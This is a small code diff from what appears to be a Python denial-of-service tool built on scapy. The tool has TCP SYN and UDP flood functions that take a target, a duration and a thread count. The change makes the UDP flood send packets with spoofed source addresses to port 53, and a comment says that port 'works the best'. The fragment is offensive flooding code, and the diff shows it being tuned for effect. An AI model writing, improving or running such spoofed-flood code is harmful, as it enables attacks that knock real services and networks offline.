@@ -23,7 +23,7 @@ def parallel_floodTCPSYN(target , duration, threads):
     pass
 
 def parallel_floodUDP(target, duration, threads): 
-    udp = scapy.IP(dst=target, src=spoof_ip())/scapy.UDP(dport=random.randint(1,65535))
+    udp = scapy.IP(dst=target, src=spoof_ip())/scapy.UDP(dport=53) # I find that 53 works the best 
     send(udp)
     pass
 
